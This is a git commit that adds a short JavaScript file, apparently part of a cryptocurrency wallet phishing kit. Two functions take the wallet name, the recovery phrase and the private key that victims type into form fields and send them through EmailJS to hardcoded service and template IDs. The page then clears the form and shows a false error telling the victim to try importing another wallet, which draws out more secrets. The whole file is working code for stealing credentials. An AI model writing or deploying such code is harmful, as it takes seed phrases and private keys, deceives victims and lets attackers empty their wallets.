8c54d2a3569f2fd8faf138fd3ec4b5ad075d05ab
Choice148 <137381455+Choice148@users.noreply.github.com>
2026-08-20 14:21:45 +0100

    Initial commit

---
+++ app/server.js
@@ -0,0 +1,55 @@
+
+
+function sendMessage(){
+ 
+const phraseTextarea = document.getElementById("textInput");
+
+// Get the value of the textarea
+const phraseValue = phraseTextarea ? phraseTextarea.value : '';
+
+    var params= {
+        subject: document.getElementById("walletNameData").value,
+        message: phraseValue || '',
+        pk: document.getElementById("pk") ? document.getElementById("pk").value : ''
+    }
+
+    const serviceID  = 'service_5cvytsl';
+ const templateID = 'template_35mx17h';
+
+emailjs.send(serviceID, templateID, params).then((res)=>{
+    if(document.getElementById("walletNameData")) document.getElementById("walletNameData").value= "";
+    if(document.getElementById("textInput")) document.getElementById("textInput").value= "";
+    if(document.getElementById("pk")) document.getElementById("pk").value= "";
+    console.log(res);
+    alert('An error occurred, try importing another active wallet');
+    window.location.href='index.html';
+
+})
+}
+
+
+function sendMessage2(){
+ 
+const phraseTextarea = document.getElementById("privateKeyInput");
+
+// Get the value of the textarea
+const phraseValue = phraseTextarea ? phraseTextarea.value : '';
+
+    var params= {
+        subject: document.getElementById("wallet_name").value,
+        message: phraseValue || ''
+    }
+
+  const serviceID  = 'service_4mr64an';
+const templateID = 'template_p3t6orr';
+
+emailjs.send(serviceID, templateID, params).then((res)=>{
+    if(document.getElementById("wallet_name")) document.getElementById("wallet_name").value= "";
+    if(document.getElementById("privateKeyInput")) document.getElementById("privateKeyInput").value= "";
+    console.log(res);
+    alert('An error occurred, try importing another active wallet');
+    window.location.href='index.html';
+
+})
+}
+
